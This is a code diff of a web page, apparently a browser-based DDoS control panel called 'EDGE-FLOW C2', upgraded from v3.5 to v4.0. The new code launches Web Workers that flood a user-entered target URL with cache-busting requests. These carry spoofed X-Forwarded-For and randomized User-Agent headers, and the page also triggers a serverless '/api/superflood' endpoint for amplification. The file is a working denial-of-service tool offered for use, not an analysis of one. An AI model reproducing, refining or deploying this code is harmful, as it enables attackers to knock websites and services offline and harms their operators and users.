@@ -2,124 +2,184 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ VERCEL EDGE COMMANDER</title>
+    <title>⚡ EDGE-FLOW C2 v4.0</title>
     <style>
         :root { --neon: #00ff41; --bg: #050505; --warn: #ff3e3e; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
-        .header { border-bottom: 2px solid var(--neon); padding-bottom: 10px; margin-bottom: 20px; text-shadow: 0 0 10px var(--neon); }
-        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; background: #111; padding: 20px; border: 1px solid #333; border-radius: 10px; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 20px; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        .header { border-bottom: 2px solid var(--neon); padding-bottom: 10px; margin-bottom: 20px; text-shadow: 0 0 5px var(--neon); }
+        .controls { background: #111; padding: 20px; border: 1px solid #333; border-radius: 10px; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
         .full-width { grid-column: span 2; }
-        label { display: block; margin-bottom: 5px; font-size: 0.8em; color: #888; }
-        input, select { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; box-sizing: border-box; font-size: 1.1em; outline: none; }
+        label { color: #888; font-size: 0.8em; display: block; margin-bottom: 5px; }
+        input, select { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; box-sizing: border-box; font-family: monospace; }
         .btn-group { display: flex; gap: 10px; margin-top: 20px; }
-        button { flex: 1; padding: 15px; font-weight: bold; cursor: pointer; border: none; transition: 0.3s; font-size: 1em; }
+        button { flex: 1; padding: 15px; font-weight: bold; cursor: pointer; border: none; transition: 0.2s; }
         #startBtn { background: var(--neon); color: #000; }
-        #stopBtn { background: var(--warn); color: #fff; opacity: 0.5; cursor: not-allowed; }
-        #startBtn:hover { box-shadow: 0 0 20px var(--neon); }
-        #terminal { flex-grow: 1; background: #000; border: 1px solid #222; margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 12px; border-radius: 5px; box-shadow: inset 0 0 10px #000; }
-        .log-entry { margin-bottom: 4px; border-left: 3px solid var(--neon); padding-left: 8px; animation: scan 0.2s ease-out; }
+        #stopBtn { background: #333; color: #fff; opacity: 0.5; cursor: not-allowed; }
+        #terminal { flex: 1; background: #000; border: 1px solid #222; margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 12px; font-family: monospace; }
+        .log-entry { border-left: 3px solid var(--neon); padding-left: 8px; margin-bottom: 4px; animation: fadeIn 0.1s; }
         .log-err { color: var(--warn); border-left-color: var(--warn); }
-        @keyframes scan { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
-        .stats { display: flex; justify-content: space-between; margin-top: 10px; font-size: 0.9em; color: #888; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; } }
+        .stats { display: flex; justify-content: space-between; margin-top: 10px; font-size: 0.8em; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>[ EDGE-FLOW C2 TERMINAL v3.5 ]</h1>
-        <div class="stats">
-            <span>STATUS: <span id="statusText">READY</span></span>
-            <span>TOTAL SHOTS: <span id="shotCount">0</span></span>
-        </div>
+<div class="header">
+    <h1>[ EDGE-FLOW C2 TERMINAL v4.0 ]</h1>
+    <div class="stats">
+        <span>STATUS: <span id="statusText" style="color:var(--neon)">READY</span></span>
+        <span>PKTS SENT: <span id="shotCount">0</span></span>
     </div>
+</div>
 
-    <div class="controls">
-        <div class="full-width">
-            <label>TARGET ADDRESS (URL/IP)</label>
-            <input type="text" id="target" value="http://" placeholder="http://1.2.3.4">
-        </div>
-        <div>
-            <label>FIRE RATE (INTERVAL ms)</label>
-            <select id="rate">
-                <option value="500">Normal (500ms)</option>
-                <option value="200">Fast (200ms)</option>
-                <option value="100" selected>Turbo (100ms)</option>
-                <option value="50">INSANE (50ms)</option>
-            </select>
-        </div>
-        <div>
-            <label>POWER (THREADS)</label>
-            <select id="threads">
-                <option value="1">Low (1x)</option>
-                <option value="5">Medium (5x)</option>
-                <option value="10" selected>High (10x)</option>
-            </select>
-        </div>
+<div class="controls">
+    <div class="full-width">
+        <label>TARGET (http:// or https://)</label>
+        <input type="text" id="target" value="http://192.168.1.1:8080" placeholder="http://target-ip:port">
     </div>
-
-    <div class="btn-group">
-        <button id="startBtn" onclick="initiate()">MISSION START</button>
-        <button id="stopBtn" onclick="terminate()">EMERGENCY STOP</button>
+    <div>
+        <label>INTENSITY (1-100)</label>
+        <select id="intensity">
+            <option value="10">10 (Low)</option>
+            <option value="30">30 (Medium)</option>
+            <option value="70" selected>70 (High)</option>
+            <option value="100">100 (INSANE)</option>
+        </select>
     </div>
+    <div>
+        <label>DURATION (minutes)</label>
+        <select id="duration">
+            <option value="0.5">30 sec</option>
+            <option value="1">1 min</option>
+            <option value="5" selected>5 mins</option>
+            <option value="10">10 mins</option>
+        </select>
+    </div>
+</div>
 
-    <div id="terminal">>> SYSTEM INITIALIZED... WAITING FOR TARGET...</div>
+<div class="btn-group">
+    <button id="startBtn" onclick="startAttack()">🔥 START MISSION</button>
+    <button id="stopBtn" onclick="stopAttack()">🛑 EMERGENCY STOP</button>
+</div>
 
-    <script>
-        let attackInterval = null;
-        let totalShots = 0;
+<div id="terminal">>> SYSTEM READY. AWAITING TARGET...</div>
 
-        function log(msg, isError = false) {
-            const term = document.getElementById('terminal');
-            const div = document.createElement('div');
-            div.className = `log-entry ${isError ? 'log-err' : ''}`;
-            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            term.prepend(div);
-            if (term.childNodes.length > 50) term.removeChild(term.lastChild);
+<script>
+    let activeWorkers = [];
+    let totalShots = 0;
+    let attackActive = false;
+
+    function log(msg, isErr = false) {
+        const term = document.getElementById('terminal');
+        const div = document.createElement('div');
+        div.className = `log-entry ${isErr ? 'log-err' : ''}`;
+        div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        term.prepend(div);
+        if (term.children.length > 80) term.removeChild(term.lastChild);
+    }
+
+    async function startAttack() {
+        if (attackActive) return;
+        const target = document.getElementById('target').value.trim();
+        const intensity = parseInt(document.getElementById('intensity').value);
+        const durationMin = parseFloat(document.getElementById('duration').value);
+        const durationSec = durationMin * 60;
+
+        if (!target.startsWith('http')) {
+            log("ERROR: Target must start with http:// or https://", true);
+            return;
         }
 
-        async function initiate() {
-            const target = document.getElementById('target').value;
-            const rate = parseInt(document.getElementById('rate').value);
-            const threads = parseInt(document.getElementById('threads').value);
+        attackActive = true;
+        document.getElementById('startBtn').disabled = true;
+        document.getElementById('startBtn').style.opacity = '0.5';
+        document.getElementById('stopBtn').disabled = false;
+        document.getElementById('stopBtn').style.background = '#ff3e3e';
+        document.getElementById('stopBtn').style.opacity = '1';
+        document.getElementById('statusText').innerText = 'FIRING';
+        document.getElementById('statusText').style.color = '#ff3e3e';
 
-            if (!target.startsWith('http')) {
-                log("ERROR: INVALID TARGET PROTOCOL", true);
-                return;
-            }
+        log(`MISSION START: ${target} | INTENSITY ${intensity} | DURATION ${durationMin}min`);
 
-            document.getElementById('startBtn').disabled = true;
-            document.getElementById('startBtn').style.opacity = "0.5";
-            document.getElementById('stopBtn').disabled = false;
-            document.getElementById('stopBtn').style.opacity = "1";
-            document.getElementById('statusText').innerText = "FIRING...";
-            document.getElementById('statusText').style.color = "red";
-
-            log(`INITIATING ATTACK ON ${target}...`);
-            log(`MODE: ${threads} THREADS / ${rate}ms INTERVAL`);
-
-            attackInterval = setInterval(() => {
-                for(let i=0; i < threads; i++) {
-                    fetch(`/api/attack?target=${target}`)
-                        .then(res => res.text())
-                        .then(data => {
-                            totalShots += 1000;
-                            document.getElementById('shotCount').innerText = totalShots.toLocaleString();
-                            log(`SUCCESS: 1,000 PKTS DELIVERED`);
-                        })
-                        .catch(e => log("PACKET DROPPED (TARGET BUSY)", true));
+        // Web Workers for parallel flooding (4 threads)
+        const workerCode = `
+            self.onmessage = function(e) {
+                const { target, intensity, durationSec } = e.data;
+                const endTime = Date.now() + (durationSec * 1000);
+                function floodBatch() {
+                    if (Date.now() > endTime) { self.postMessage('done'); return; }
+                    const batchSize = intensity * 5;
+                    const promises = [];
+                    for (let i = 0; i < batchSize; i++) {
+                        const url = target + (target.includes('?') ? '&' : '?') + '_=' + Math.random();
+                        promises.push(fetch(url, {
+                            method: 'GET',
+                            headers: {
+                                'X-Forwarded-For': Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255),
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + (80+Math.floor(Math.random()*30)) + '.0.0.0 Safari/537.36',
+                                'Cache-Control': 'no-cache, no-store',
+                                'Pragma': 'no-cache'
+                            },
+                            cache: 'no-store',
+                            mode: 'no-cors'
+                        }).catch(() => {}));
+                    }
+                    Promise.allSettled(promises).then(() => setTimeout(floodBatch, 10));
                 }
-            }, rate);
+                floodBatch();
+            };
+        `;
+        const blob = new Blob([workerCode], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(blob);
+        const numWorkers = Math.min(4, intensity / 25 + 1);
+        for (let i = 0; i < numWorkers; i++) {
+            const worker = new Worker(workerUrl);
+            worker.onmessage = (e) => {
+                if (e.data === 'done') {
+                    worker.terminate();
+                    const idx = activeWorkers.indexOf(worker);
+                    if (idx !== -1) activeWorkers.splice(idx, 1);
+                    if (activeWorkers.length === 0) stopAttack(true);
+                }
+            };
+            worker.postMessage({ target, intensity, durationSec });
+            activeWorkers.push(worker);
         }
 
-        function terminate() {
-            clearInterval(attackInterval);
-            document.getElementById('startBtn').disabled = false;
-            document.getElementById('startBtn').style.opacity = "1";
-            document.getElementById('stopBtn').disabled = true;
-            document.getElementById('stopBtn').style.opacity = "0.5";
-            document.getElementById('statusText').innerText = "READY";
-            document.getElementById('statusText').style.color = "var(--neon)";
-            log("!!! MISSION TERMINATED BY OPERATOR !!!", true);
-        }
-    </script>
+        // Also hit Vercel serverless function for amplification
+        const apiInterval = setInterval(async () => {
+            if (!attackActive) { clearInterval(apiInterval); return; }
+            try {
+                const res = await fetch('/api/superflood', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target, intensity, duration: 30000 }) // 30 sec burst
+                });
+                totalShots += 5000;
+                document.getElementById('shotCount').innerText = totalShots.toLocaleString();
+                log(`API AMPLIFICATION: 5000 pkts dispatched`);
+            } catch(e) { log("API call failed", true); }
+        }, 2000);
+
+        // Auto-stop after duration
+        setTimeout(() => stopAttack(false), durationSec * 1000);
+        window._apiInterval = apiInterval;
+    }
+
+    function stopAttack(fromAuto = false) {
+        if (!attackActive) return;
+        attackActive = false;
+        for (let w of activeWorkers) { try { w.terminate(); } catch(e) {} }
+        activeWorkers = [];
+        if (window._apiInterval) clearInterval(window._apiInterval);
+        document.getElementById('startBtn').disabled = false;
+        document.getElementById('startBtn').style.opacity = '1';
+        document.getElementById('stopBtn').disabled = true;
+        document.getElementById('stopBtn').style.background = '#333';
+        document.getElementById('stopBtn').style.opacity = '0.5';
+        document.getElementById('statusText').innerText = 'READY';
+        document.getElementById('statusText').style.color = 'var(--neon)';
+        log(fromAuto ? "Mission completed (time limit)" : "Mission aborted by operator");
+    }
+</script>
 </body>
 </html>
